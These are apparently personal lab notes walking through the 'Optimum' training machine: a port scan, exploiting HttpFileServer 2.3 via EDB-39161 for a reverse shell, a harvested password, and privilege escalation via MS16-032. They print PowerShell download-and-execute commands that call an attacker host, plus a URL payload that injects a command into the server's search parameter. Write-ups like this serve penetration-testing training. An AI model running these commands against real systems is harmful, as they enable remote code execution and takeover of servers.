# Optimum

10.10.10.8


Nmap discovers the only port open is port 80.

It's running HttpFileServer 2.3
![[Pasted image 20220713202221.png]]

Using EDB-39161 we are able to get a reverse shell as kostas.

Winpeas found kostas' password
![[Pasted image 20220713204437.png]]
```password
kdeEjDowkS*
```

Upgrade to a powershell shell so we can run sherlock:

```cmd.exe
powershell -c "IEX (new-object net.webclient).downloadstring('http://10.10.16.4:80/shell.ps1')"
```

Then we load and run sherlock. It looks like the system is vulnerable to MS16-032

Unfortunately our shell is running in a 32bit process, so we need to drop the shell and upgrade it by running powershell naitive:

```
http://10.10.10.8/?search=%00{.+exec|C%3a\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe%20IEX%20(new-object%20net.webclient).downloadstring(%27http://10.10.16.4:80/shell.ps1%27)%22+.}
```

Now we're running a 64 bit process and can run the exploit:

```
IEX (new-object net.webclient).downloadstring('http://10.10.16.4:80/MS16-032.ps1')
```